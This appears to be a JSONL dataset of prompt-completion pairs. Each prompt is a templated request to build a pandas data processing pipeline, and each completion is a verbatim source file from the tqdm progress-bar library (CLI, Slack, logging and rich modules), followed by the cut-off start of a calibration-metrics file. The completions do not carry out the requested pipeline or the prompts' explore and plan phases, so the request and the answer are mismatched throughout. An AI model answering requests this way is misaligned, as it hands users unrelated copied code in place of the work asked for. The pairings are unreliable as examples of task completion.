{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from ._monitor import TMonitor, TqdmSynchronisationWarning\nfrom ._tqdm_pandas import tqdm_pandas\nfrom .cli import main  # TODO: remove in v5.0.0\nfrom .gui import tqdm as tqdm_gui  # TODO: remove in v5.0.0\nfrom .gui import trange as tgrange  # TODO: remove in v5.0.0\nfrom .std import (\n    TqdmDeprecationWarning, TqdmExperimentalWarning, TqdmKeyError, TqdmMonitorWarning,\n    TqdmTypeError, TqdmWarning, tqdm, trange)\nfrom .version import __version__\n\n__all__ = ['tqdm', 'tqdm_gui', 'trange', 'tgrange', 'tqdm_pandas',\n           'tqdm_notebook', 'tnrange', 'main', 'TMonitor',\n           'TqdmTypeError', 'TqdmKeyError',\n           'TqdmWarning', 'TqdmDeprecationWarning',\n           'TqdmExperimentalWarning',\n           'TqdmMonitorWarning', 'TqdmSynchronisationWarning',\n           '__version__']\n\n\ndef tqdm_notebook(*args, **kwargs):  # pragma: no cover\n    \"\"\"See tqdm.notebook.tqdm for full documentation\"\"\"\n    from warnings import warn\n\n    from .notebook import tqdm as _tqdm_notebook\n    warn(\"This function will be removed in tqdm==5.0.0\\n\"\n         \"Please use `tqdm.notebook.tqdm` instead of `tqdm.tqdm_notebook`\",\n         TqdmDeprecationWarning, stacklevel=2)\n    return _tqdm_notebook(*args, **kwargs)\n\n\ndef tnrange(*args, **kwargs):  # pragma: no cover\n    \"\"\"Shortcut for `tqdm.notebook.tqdm(range(*args), **kwargs)`.\"\"\"\n    from warnings import warn\n\n    from .notebook import trange as _tnrange\n    warn(\"Please use `tqdm.notebook.trange` instead of `tqdm.tnrange`\",\n         TqdmDeprecationWarning, stacklevel=2)\n    return _tnrange(*args, **kwargs)\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tqdm/__init__.py", "language": "python", "complexity": "simple", "star_count": 30170, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import sys\n\n__author__ = \"github.com/casperdcl\"\n__all__ = ['tqdm_pandas']\n\n\ndef tqdm_pandas(tclass, **tqdm_kwargs):\n    \"\"\"\n    Registers the given `tqdm` instance with\n    `pandas.core.groupby.DataFrameGroupBy.progress_apply`.\n    \"\"\"\n    from tqdm import TqdmDeprecationWarning\n\n    if isinstance(tclass, type) or (getattr(tclass, '__name__', '').startswith(\n            'tqdm_')):  # delayed adapter case\n        TqdmDeprecationWarning(\n            \"Please use `tqdm.pandas(...)` instead of `tqdm_pandas(tqdm, ...)`.\",\n            fp_write=getattr(tqdm_kwargs.get('file', None), 'write', sys.stderr.write))\n        tclass.pandas(**tqdm_kwargs)\n    else:\n        TqdmDeprecationWarning(\n            \"Please use `tqdm.pandas(...)` instead of `tqdm_pandas(tqdm(...))`.\",\n            fp_write=getattr(tclass.fp, 'write', sys.stderr.write))\n        type(tclass).pandas(deprecated_t=tclass)\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tqdm/_tqdm_pandas.py", "language": "python", "complexity": "simple", "star_count": 30170, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nModule version for monitoring CLI pipes (`... | python -m tqdm | ...`).\n\"\"\"\nimport logging\nimport re\nimport sys\nfrom ast import literal_eval as numeric\nfrom textwrap import indent\n\nfrom .std import TqdmKeyError, TqdmTypeError, tqdm\nfrom .version import __version__\n\n__all__ = [\"main\"]\nlog = logging.getLogger(__name__)\n\n\ndef cast(val, typ):\n    log.debug((val, typ))\n    if \" or \" in typ:\n        for t in typ.split(\" or \"):\n            try:\n                return cast(val, t)\n            except TqdmTypeError:\n                pass\n        raise TqdmTypeError(f\"{val} : {typ}\")\n\n    # sys.stderr.write('\\ndebug | `val:type`: `' + val + ':' + typ + '`.\\n')\n    if typ == 'bool':\n        if (val == 'True') or (val == ''):\n            return True\n        if val == 'False':\n            return False\n        raise TqdmTypeError(val + ' : ' + typ)\n    if typ == 'chr':\n        if len(val) == 1:\n            return val.encode()\n        if re.match(r\"^\\\\\\w+$\", val):\n            return eval(f'\"{val}\"').encode()\n        raise TqdmTypeError(f\"{val} : {typ}\")\n    if typ == 'str':\n        return val\n    if typ == 'int':\n        try:\n            return int(val)\n        except ValueError as exc:\n            raise TqdmTypeError(f\"{val} : {typ}\") from exc\n    if typ == 'float':\n        try:\n            return float(val)\n        except ValueError as exc:\n            raise TqdmTypeError(f\"{val} : {typ}\") from exc\n    raise TqdmTypeError(f\"{val} : {typ}\")\n\n\ndef posix_pipe(fin, fout, delim=b'\\\\n', buf_size=256,\n               callback=lambda float: None, callback_len=True):\n    \"\"\"\n    Params\n    ------\n    fin  : binary file with `read(buf_size : int)` method\n    fout  : binary file with `write` (and optionally `flush`) methods.\n    callback  : function(float), e.g.: `tqdm.update`\n    callback_len  : If (default: True) do `callback(len(buffer))`.\n      Otherwise, do `callback(data) for data in buffer.split(delim)`.\n    \"\"\"\n    fp_write = fout.write\n\n    if not delim:\n        while True:\n            tmp = fin.read(buf_size)\n\n            # flush at EOF\n            if not tmp:\n                getattr(fout, 'flush', lambda: None)()\n                return\n\n            fp_write(tmp)\n            callback(len(tmp))\n        # return\n\n    buf = b''\n    len_delim = len(delim)\n    # n = 0\n    while True:\n        tmp = fin.read(buf_size)\n\n        # flush at EOF\n        if not tmp:\n            if buf:\n                fp_write(buf)\n                if callback_len:\n                    # n += 1 + buf.count(delim)\n                    callback(1 + buf.count(delim))\n                else:\n                    for i in buf.split(delim):\n                        callback(i)\n            getattr(fout, 'flush', lambda: None)()\n            return  # n\n\n        while True:\n            i = tmp.find(delim)\n            if i < 0:\n                buf += tmp\n                break\n            fp_write(buf + tmp[:i + len(delim)])\n            # n += 1\n            callback(1 if callback_len else (buf + tmp[:i]))\n            buf = b''\n            tmp = tmp[i + len_delim:]\n\n\n# ((opt, type), ... )\nRE_OPTS = re.compile(r'\\n {4}(\\S+)\\s{2,}:\\s*([^,]+)')\n# better split method assuming no positional args\nRE_SHLEX = re.compile(r'\\s*(?<!\\S)--?([^\\s=]+)(\\s+|=|$)')\n\n# TODO: add custom support for some of the following?\nUNSUPPORTED_OPTS = ('iterable', 'gui', 'out', 'file')\n\n# The 8 leading spaces are required for consistency\nCLI_EXTRA_DOC = r\"\"\"\n    Extra CLI Options\n    -----------------\n    name  : type, optional\n        TODO: find out why this is needed.\n    delim  : chr, optional\n        Delimiting character [default: '\\n']. Use '\\0' for null.\n        N.B.: on Windows systems, Python converts '\\n' to '\\r\\n'.\n    buf_size  : int, optional\n        String buffer size in bytes [default: 256]\n        used when `delim` is specified.\n    bytes  : bool, optional\n        If true, will count bytes, ignore `delim`, and default\n        `unit_scale` to True, `unit_divisor` to 1024, and `unit` to 'B'.\n    tee  : bool, optional\n        If true, passes `stdin` to both `stderr` and `stdout`.\n    update  : bool, optional\n        If true, will treat input as newly elapsed iterations,\n        i.e. numbers to pass to `update()`. Note that this is slow\n        (~2e5 it/s) since every input must be decoded as a number.\n    update_to  : bool, optional\n        If true, will treat input as total elapsed iterations,\n        i.e. numbers to assign to `self.n`. Note that this is slow\n        (~2e5 it/s) since every input must be decoded as a number.\n    null  : bool, optional\n        If true, will discard input (no stdout).\n    manpath  : str, optional\n        Directory in which to install tqdm man pages.\n    comppath  : str, optional\n        Directory in which to place tqdm completion.\n    log  : str, optional\n        CRITICAL|FATAL|ERROR|WARN(ING)|[default: 'INFO']|DEBUG|NOTSET.\n\"\"\"\n\n\ndef main(fp=sys.stderr, argv=None):\n    \"\"\"\n    Parameters (internal use only)\n    ---------\n    fp  : file-like object for tqdm\n    argv  : list (default: sys.argv[1:])\n    \"\"\"\n    if argv is None:\n        argv = sys.argv[1:]\n    try:\n        log_idx = argv.index('--log')\n    except ValueError:\n        for i in argv:\n            if i.startswith('--log='):\n                logLevel = i[len('--log='):]\n                break\n        else:\n            logLevel = 'INFO'\n    else:\n        # argv.pop(log_idx)\n        # logLevel = argv.pop(log_idx)\n        logLevel = argv[log_idx + 1]\n    logging.basicConfig(level=getattr(logging, logLevel),\n                        format=\"%(levelname)s:%(module)s:%(lineno)d:%(message)s\")\n\n    # py<3.13 doesn't dedent docstrings\n    d = (tqdm.__doc__ if sys.version_info < (3, 13)\n         else indent(tqdm.__doc__, \"    \")) + CLI_EXTRA_DOC\n\n    opt_types = dict(RE_OPTS.findall(d))\n    # opt_types['delim'] = 'chr'\n\n    for o in UNSUPPORTED_OPTS:\n        opt_types.pop(o)\n\n    log.debug(sorted(opt_types.items()))\n\n    # d = RE_OPTS.sub(r'  --\\1=<\\1>  : \\2', d)\n    split = RE_OPTS.split(d)\n    opt_types_desc = zip(split[1::3], split[2::3], split[3::3])\n    d = ''.join(('\\n  --{0}  : {2}{3}' if otd[1] == 'bool' else\n                 '\\n  --{0}=<{1}>  : {2}{3}').format(\n                     otd[0].replace('_', '-'), otd[0], *otd[1:])\n                for otd in opt_types_desc if otd[0] not in UNSUPPORTED_OPTS)\n\n    help_short = \"Usage:\\n  tqdm [--help | options]\\n\"\n    d = help_short + \"\"\"\nOptions:\n  -h, --help     Print this help and exit.\n  -v, --version  Print version and exit.\n\"\"\" + d.strip('\\n') + '\\n'\n\n    # opts = docopt(d, version=__version__)\n    if any(v in argv for v in ('-v', '--version')):\n        sys.stdout.write(__version__ + '\\n')\n        sys.exit(0)\n    elif any(v in argv for v in ('-h', '--help')):\n        sys.stdout.write(d + '\\n')\n        sys.exit(0)\n    elif argv and argv[0][:2] != '--':\n        sys.stderr.write(f\"Error:Unknown argument:{argv[0]}\\n{help_short}\")\n\n    argv = RE_SHLEX.split(' '.join([\"tqdm\"] + argv))\n    opts = dict(zip(argv[1::3], argv[3::3]))\n\n    log.debug(opts)\n    opts.pop('log', True)\n\n    tqdm_args = {'file': fp}\n    try:\n        for (o, v) in opts.items():\n            o = o.replace('-', '_')\n            try:\n                tqdm_args[o] = cast(v, opt_types[o])\n            except KeyError as e:\n                raise TqdmKeyError(str(e))\n        log.debug('args:' + str(tqdm_args))\n\n        delim_per_char = tqdm_args.pop('bytes', False)\n        update = tqdm_args.pop('update', False)\n        update_to = tqdm_args.pop('update_to', False)\n        if sum((delim_per_char, update, update_to)) > 1:\n            raise TqdmKeyError(\"Can only have one of --bytes --update --update_to\")\n    except Exception:\n        fp.write(\"\\nError:\\n\" + help_short)\n        stdin, stdout_write = sys.stdin, sys.stdout.write\n        for i in stdin:\n            stdout_write(i)\n        raise\n    else:\n        buf_size = tqdm_args.pop('buf_size', 256)\n        delim = tqdm_args.pop('delim', b'\\\\n')\n        tee = tqdm_args.pop('tee', False)\n        manpath = tqdm_args.pop('manpath', None)\n        comppath = tqdm_args.pop('comppath', None)\n        if tqdm_args.pop('null', False):\n            class stdout(object):\n                @staticmethod\n                def write(_):\n                    pass\n        else:\n            stdout = sys.stdout\n            stdout = getattr(stdout, 'buffer', stdout)\n        stdin = getattr(sys.stdin, 'buffer', sys.stdin)\n        if manpath or comppath:\n            try:  # py<3.9\n                import importlib_resources as resources\n            except ImportError:\n                from importlib import resources\n            from pathlib import Path\n\n            def cp(name, dst):\n                \"\"\"copy resource `name` to `dst`\"\"\"\n                fi = resources.files('tqdm') / name\n                dst.write_bytes(fi.read_bytes())\n                log.info(\"written:%s\", dst)\n            if manpath is not None:\n                cp('tqdm.1', Path(manpath) / 'tqdm.1')\n            if comppath is not None:\n                cp('completion.sh', Path(comppath) / 'tqdm_completion.sh')\n            sys.exit(0)\n        if tee:\n            stdout_write = stdout.write\n            fp_write = getattr(fp, 'buffer', fp).write\n\n            class stdout(object):  # pylint: disable=function-redefined\n                @staticmethod\n                def write(x):\n                    with tqdm.external_write_mode(file=fp):\n                        fp_write(x)\n                    stdout_write(x)\n        if delim_per_char:\n            tqdm_args.setdefault('unit', 'B')\n            tqdm_args.setdefault('unit_scale', True)\n            tqdm_args.setdefault('unit_divisor', 1024)\n            log.debug(tqdm_args)\n            with tqdm(**tqdm_args) as t:\n                posix_pipe(stdin, stdout, '', buf_size, t.update)\n        elif delim == b'\\\\n':\n            log.debug(tqdm_args)\n            write = stdout.write\n            if update or update_to:\n                with tqdm(**tqdm_args) as t:\n                    if update:\n                        def callback(i):\n                            t.update(numeric(i.decode()))\n                    else:  # update_to\n                        def callback(i):\n                            t.update(numeric(i.decode()) - t.n)\n                    for i in stdin:\n                        write(i)\n                        callback(i)\n            else:\n                for i in tqdm(stdin, **tqdm_args):\n                    write(i)\n        else:\n            log.debug(tqdm_args)\n            with tqdm(**tqdm_args) as t:\n                callback_len = False\n                if update:\n                    def callback(i):\n                        t.update(numeric(i.decode()))\n                elif update_to:\n                    def callback(i):\n                        t.update(numeric(i.decode()) - t.n)\n                else:\n                    callback = t.update\n                    callback_len = True\n                posix_pipe(stdin, stdout, delim, buf_size, callback, callback_len)\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tqdm/cli.py", "language": "python", "complexity": "complex", "star_count": 30170, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nEven more features than `tqdm.auto` (all the bells & whistles):\n\n- `tqdm.auto`\n- `tqdm.tqdm.pandas`\n- `tqdm.contrib.telegram`\n    + uses `${TQDM_TELEGRAM_TOKEN}` and `${TQDM_TELEGRAM_CHAT_ID}`\n- `tqdm.contrib.discord`\n    + uses `${TQDM_DISCORD_TOKEN}` and `${TQDM_DISCORD_CHANNEL_ID}`\n\"\"\"\n__all__ = ['tqdm', 'trange']\nimport warnings\nfrom os import getenv\n\nif getenv(\"TQDM_SLACK_TOKEN\") and getenv(\"TQDM_SLACK_CHANNEL\"):\n    from .slack import tqdm, trange\nelif getenv(\"TQDM_TELEGRAM_TOKEN\") and getenv(\"TQDM_TELEGRAM_CHAT_ID\"):\n    from .telegram import tqdm, trange\nelif getenv(\"TQDM_DISCORD_TOKEN\") and getenv(\"TQDM_DISCORD_CHANNEL_ID\"):\n    from .discord import tqdm, trange\nelse:\n    from ..auto import tqdm, trange\n\nwith warnings.catch_warnings():\n    warnings.simplefilter(\"ignore\", category=FutureWarning)\n    tqdm.pandas()\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tqdm/contrib/bells.py", "language": "python", "complexity": "simple", "star_count": 30170, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nHelper functionality for interoperability with stdlib `logging`.\n\"\"\"\nimport logging\nimport sys\nfrom contextlib import contextmanager\n\ntry:\n    from typing import Iterator, List, Optional, Type  # noqa: F401\nexcept ImportError:\n    pass\n\nfrom ..std import tqdm as std_tqdm\n\n\nclass _TqdmLoggingHandler(logging.StreamHandler):\n    def __init__(\n        self,\n        tqdm_class=std_tqdm  # type: Type[std_tqdm]\n    ):\n        super().__init__()\n        self.tqdm_class = tqdm_class\n\n    def emit(self, record):\n        try:\n            msg = self.format(record)\n            self.tqdm_class.write(msg, file=self.stream)\n            self.flush()\n        except (KeyboardInterrupt, SystemExit):\n            raise\n        except:  # noqa pylint: disable=bare-except\n            self.handleError(record)\n\n\ndef _is_console_logging_handler(handler):\n    return (isinstance(handler, logging.StreamHandler)\n            and handler.stream in {sys.stdout, sys.stderr})\n\n\ndef _get_first_found_console_logging_handler(handlers):\n    for handler in handlers:\n        if _is_console_logging_handler(handler):\n            return handler\n\n\n@contextmanager\ndef logging_redirect_tqdm(\n    loggers=None,  # type: Optional[List[logging.Logger]],\n    tqdm_class=std_tqdm  # type: Type[std_tqdm]\n):\n    # type: (...) -> Iterator[None]\n    \"\"\"\n    Context manager redirecting console logging to `tqdm.write()`, leaving\n    other logging handlers (e.g. log files) unaffected.\n\n    Parameters\n    ----------\n    loggers  : list, optional\n      Which handlers to redirect (default: [logging.root]).\n    tqdm_class  : optional\n\n    Example\n    -------\n    ```python\n    import logging\n    from tqdm import trange\n    from tqdm.contrib.logging import logging_redirect_tqdm\n\n    LOG = logging.getLogger(__name__)\n\n    if __name__ == '__main__':\n        logging.basicConfig(level=logging.INFO)\n        with logging_redirect_tqdm():\n            for i in trange(9):\n                if i == 4:\n                    LOG.info(\"console logging redirected to `tqdm.write()`\")\n        # logging restored\n    ```\n    \"\"\"\n    if loggers is None:\n        loggers = [logging.root]\n    original_handlers_list = [logger.handlers for logger in loggers]\n    try:\n        for logger in loggers:\n            tqdm_handler = _TqdmLoggingHandler(tqdm_class)\n            orig_handler = _get_first_found_console_logging_handler(logger.handlers)\n            if orig_handler is not None:\n                tqdm_handler.setFormatter(orig_handler.formatter)\n                tqdm_handler.stream = orig_handler.stream\n            logger.handlers = [\n                handler for handler in logger.handlers\n                if not _is_console_logging_handler(handler)] + [tqdm_handler]\n        yield\n    finally:\n        for logger, original_handlers in zip(loggers, original_handlers_list):\n            logger.handlers = original_handlers\n\n\n@contextmanager\ndef tqdm_logging_redirect(\n    *args,\n    # loggers=None,  # type: Optional[List[logging.Logger]]\n    # tqdm=None,  # type: Optional[Type[tqdm.tqdm]]\n    **kwargs\n):\n    # type: (...) -> Iterator[None]\n    \"\"\"\n    Convenience shortcut for:\n    ```python\n    with tqdm_class(*args, **tqdm_kwargs) as pbar:\n        with logging_redirect_tqdm(loggers=loggers, tqdm_class=tqdm_class):\n            yield pbar\n    ```\n\n    Parameters\n    ----------\n    tqdm_class  : optional, (default: tqdm.std.tqdm).\n    loggers  : optional, list.\n    **tqdm_kwargs  : passed to `tqdm_class`.\n    \"\"\"\n    tqdm_kwargs = kwargs.copy()\n    loggers = tqdm_kwargs.pop('loggers', None)\n    tqdm_class = tqdm_kwargs.pop('tqdm_class', std_tqdm)\n    with tqdm_class(*args, **tqdm_kwargs) as pbar:\n        with logging_redirect_tqdm(loggers=loggers, tqdm_class=tqdm_class):\n            yield pbar\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tqdm/contrib/logging.py", "language": "python", "complexity": "medium", "star_count": 30170, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nSends updates to a Slack app.\n\nUsage:\n>>> from tqdm.contrib.slack import tqdm, trange\n>>> for i in trange(10, token='{token}', channel='{channel}'):\n...     ...\n\n![screenshot](https://tqdm.github.io/img/screenshot-slack.png)\n\"\"\"\nimport logging\nfrom os import getenv\n\ntry:\n    from slack_sdk import WebClient\nexcept ImportError:\n    raise ImportError(\"Please `pip install slack-sdk`\")\n\nfrom ..auto import tqdm as tqdm_auto\nfrom .utils_worker import MonoWorker\n\n__author__ = {\"github.com/\": [\"0x2b3bfa0\", \"casperdcl\"]}\n__all__ = ['SlackIO', 'tqdm_slack', 'tsrange', 'tqdm', 'trange']\n\n\nclass SlackIO(MonoWorker):\n    \"\"\"Non-blocking file-like IO using a Slack app.\"\"\"\n    def __init__(self, token, channel):\n        \"\"\"Creates a new message in the given `channel`.\"\"\"\n        super().__init__()\n        self.client = WebClient(token=token)\n        self.text = self.__class__.__name__\n        try:\n            self.message = self.client.chat_postMessage(channel=channel, text=self.text)\n        except Exception as e:\n            tqdm_auto.write(str(e))\n            self.message = None\n\n    def write(self, s):\n        \"\"\"Replaces internal `message`'s text with `s`.\"\"\"\n        if not s:\n            s = \"...\"\n        s = s.replace('\\r', '').strip()\n        if s == self.text:\n            return  # skip duplicate message\n        message = self.message\n        if message is None:\n            return\n        self.text = s\n        try:\n            future = self.submit(self.client.chat_update, channel=message['channel'],\n                                 ts=message['ts'], text='`' + s + '`')\n        except Exception as e:\n            tqdm_auto.write(str(e))\n        else:\n            return future\n\n\nclass tqdm_slack(tqdm_auto):\n    \"\"\"\n    Standard `tqdm.auto.tqdm` but also sends updates to a Slack app.\n    May take a few seconds to create (`__init__`).\n\n    - create a Slack app with the `chat:write` scope & invite it to a\n      channel: <https://api.slack.com/authentication/basics>\n    - copy the bot `{token}` & `{channel}` and paste below\n    >>> from tqdm.contrib.slack import tqdm, trange\n    >>> for i in tqdm(iterable, token='{token}', channel='{channel}'):\n    ...     ...\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        \"\"\"\n        Parameters\n        ----------\n        token  : str, required. Slack token\n            [default: ${TQDM_SLACK_TOKEN}].\n        channel  : int, required. Slack channel\n            [default: ${TQDM_SLACK_CHANNEL}].\n        mininterval  : float, optional.\n          Minimum of [default: 1.5] to avoid rate limit.\n\n        See `tqdm.auto.tqdm.__init__` for other parameters.\n        \"\"\"\n        if not kwargs.get('disable'):\n            kwargs = kwargs.copy()\n            logging.getLogger(\"HTTPClient\").setLevel(logging.WARNING)\n            self.sio = SlackIO(\n                kwargs.pop('token', getenv(\"TQDM_SLACK_TOKEN\")),\n                kwargs.pop('channel', getenv(\"TQDM_SLACK_CHANNEL\")))\n            kwargs['mininterval'] = max(1.5, kwargs.get('mininterval', 1.5))\n        super().__init__(*args, **kwargs)\n\n    def display(self, **kwargs):\n        super().display(**kwargs)\n        fmt = self.format_dict\n        if fmt.get('bar_format', None):\n            fmt['bar_format'] = fmt['bar_format'].replace(\n                '<bar/>', '`{bar:10}`').replace('{bar}', '`{bar:10u}`')\n        else:\n            fmt['bar_format'] = '{l_bar}`{bar:10}`{r_bar}'\n        if fmt['ascii'] is False:\n            fmt['ascii'] = [\":black_square:\", \":small_blue_diamond:\", \":large_blue_diamond:\",\n                            \":large_blue_square:\"]\n            fmt['ncols'] = 336\n        self.sio.write(self.format_meter(**fmt))\n\n    def clear(self, *args, **kwargs):\n        super().clear(*args, **kwargs)\n        if not self.disable:\n            self.sio.write(\"\")\n\n\ndef tsrange(*args, **kwargs):\n    \"\"\"Shortcut for `tqdm.contrib.slack.tqdm(range(*args), **kwargs)`.\"\"\"\n    return tqdm_slack(range(*args), **kwargs)\n\n\n# Aliases\ntqdm = tqdm_slack\ntrange = tsrange\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tqdm/contrib/slack.py", "language": "python", "complexity": "medium", "star_count": 30170, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\n`rich.progress` decorator for iterators.\n\nUsage:\n>>> from tqdm.rich import trange, tqdm\n>>> for i in trange(10):\n...     ...\n\"\"\"\nfrom warnings import warn\n\nfrom rich.progress import (\n    BarColumn, Progress, ProgressColumn, Text, TimeElapsedColumn, TimeRemainingColumn, filesize)\n\nfrom .std import TqdmExperimentalWarning\nfrom .std import tqdm as std_tqdm\n\n__author__ = {\"github.com/\": [\"casperdcl\"]}\n__all__ = ['tqdm_rich', 'trrange', 'tqdm', 'trange']\n\n\nclass FractionColumn(ProgressColumn):\n    \"\"\"Renders completed/total, e.g. '0.5/2.3 G'.\"\"\"\n    def __init__(self, unit_scale=False, unit_divisor=1000):\n        self.unit_scale = unit_scale\n        self.unit_divisor = unit_divisor\n        super().__init__()\n\n    def render(self, task):\n        \"\"\"Calculate common unit for completed and total.\"\"\"\n        completed = int(task.completed)\n        total = int(task.total)\n        if self.unit_scale:\n            unit, suffix = filesize.pick_unit_and_suffix(\n                total,\n                [\"\", \"K\", \"M\", \"G\", \"T\", \"P\", \"E\", \"Z\", \"Y\"],\n                self.unit_divisor,\n            )\n        else:\n            unit, suffix = filesize.pick_unit_and_suffix(total, [\"\"], 1)\n        precision = 0 if unit == 1 else 1\n        return Text(\n            f\"{completed/unit:,.{precision}f}/{total/unit:,.{precision}f} {suffix}\",\n            style=\"progress.download\")\n\n\nclass RateColumn(ProgressColumn):\n    \"\"\"Renders human readable transfer speed.\"\"\"\n    def __init__(self, unit=\"\", unit_scale=False, unit_divisor=1000):\n        self.unit = unit\n        self.unit_scale = unit_scale\n        self.unit_divisor = unit_divisor\n        super().__init__()\n\n    def render(self, task):\n        \"\"\"Show data transfer speed.\"\"\"\n        speed = task.speed\n        if speed is None:\n            return Text(f\"? {self.unit}/s\", style=\"progress.data.speed\")\n        if self.unit_scale:\n            unit, suffix = filesize.pick_unit_and_suffix(\n                speed,\n                [\"\", \"K\", \"M\", \"G\", \"T\", \"P\", \"E\", \"Z\", \"Y\"],\n                self.unit_divisor,\n            )\n        else:\n            unit, suffix = filesize.pick_unit_and_suffix(speed, [\"\"], 1)\n        precision = 0 if unit == 1 else 1\n        return Text(f\"{speed/unit:,.{precision}f} {suffix}{self.unit}/s\",\n                    style=\"progress.data.speed\")\n\n\nclass tqdm_rich(std_tqdm):  # pragma: no cover\n    \"\"\"Experimental rich.progress GUI version of tqdm!\"\"\"\n    # TODO: @classmethod: write()?\n    def __init__(self, *args, **kwargs):\n        \"\"\"\n        This class accepts the following parameters *in addition* to\n        the parameters accepted by `tqdm`.\n\n        Parameters\n        ----------\n        progress  : tuple, optional\n            arguments for `rich.progress.Progress()`.\n        options  : dict, optional\n            keyword arguments for `rich.progress.Progress()`.\n        \"\"\"\n        kwargs = kwargs.copy()\n        kwargs['gui'] = True\n        # convert disable = None to False\n        kwargs['disable'] = bool(kwargs.get('disable', False))\n        progress = kwargs.pop('progress', None)\n        options = kwargs.pop('options', {}).copy()\n        super().__init__(*args, **kwargs)\n\n        if self.disable:\n            return\n\n        warn(\"rich is experimental/alpha\", TqdmExperimentalWarning, stacklevel=2)\n        d = self.format_dict\n        if progress is None:\n            progress = (\n                \"[progress.description]{task.description}\"\n                \"[progress.percentage]{task.percentage:>4.0f}%\",\n                BarColumn(bar_width=None),\n                FractionColumn(\n                    unit_scale=d['unit_scale'], unit_divisor=d['unit_divisor']),\n                \"[\", TimeElapsedColumn(), \"<\", TimeRemainingColumn(),\n                \",\", RateColumn(unit=d['unit'], unit_scale=d['unit_scale'],\n                                unit_divisor=d['unit_divisor']), \"]\"\n            )\n        options.setdefault('transient', not self.leave)\n        self._prog = Progress(*progress, **options)\n        self._prog.__enter__()\n        self._task_id = self._prog.add_task(self.desc or \"\", **d)\n\n    def close(self):\n        if self.disable:\n            return\n        self.display()  # print 100%, vis #1306\n        super().close()\n        self._prog.__exit__(None, None, None)\n\n    def clear(self, *_, **__):\n        pass\n\n    def display(self, *_, **__):\n        if not hasattr(self, '_prog'):\n            return\n        self._prog.update(self._task_id, completed=self.n, description=self.desc)\n\n    def reset(self, total=None):\n        \"\"\"\n        Resets to 0 iterations for repeated use.\n\n        Parameters\n        ----------\n        total  : int or float, optional. Total to use for the new bar.\n        \"\"\"\n        if hasattr(self, '_prog'):\n            self._prog.reset(total=total)\n        super().reset(total=total)\n\n\ndef trrange(*args, **kwargs):\n    \"\"\"Shortcut for `tqdm.rich.tqdm(range(*args), **kwargs)`.\"\"\"\n    return tqdm_rich(range(*args), **kwargs)\n\n\n# Aliases\ntqdm = tqdm_rich\ntrange = trrange\n", "metadata": {"source": "github.com/tqdm/tqdm", "file_path": "tqdm/rich.py", "language": "python", "complexity": "medium", "star_count": 30170, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from __future__ import division\nimport numpy as np\n\n__author__ = \"Eric Chiang\"\n__email__  = \"eric[at]yhathq.com\"\n\n\"\"\"\n\nMeasurements inspired by Philip Tetlock's \"Expert Political Judgment\"\n\nEquations take from Yaniv, Yates, & Smith (1991):\n  \"Measures of Descrimination Skill in Probabilistic Judgement\"\n\n\"\"\"\n\n\ndef calibration(prob,outcome,n_bins=10):\n    \"\"\"Calibration measurement for a set of predictions.\n\n    When predicting events at a given probability, how far is frequency\n    of positive outcomes from that probability?\n    NOTE: Lower scores are better\n\n    prob: array_like, float\n        Probability estimates for a set of events\n\n    outcome: array_like, bool\n        If event predicted occurred\n\n    n_bins: int\n        Number of judgement categories to prefrom calculation over.\n        Prediction are binned based on probability, since \"descrete\" \n        probabilities aren't required. \n\n    \"\"\"\n    prob 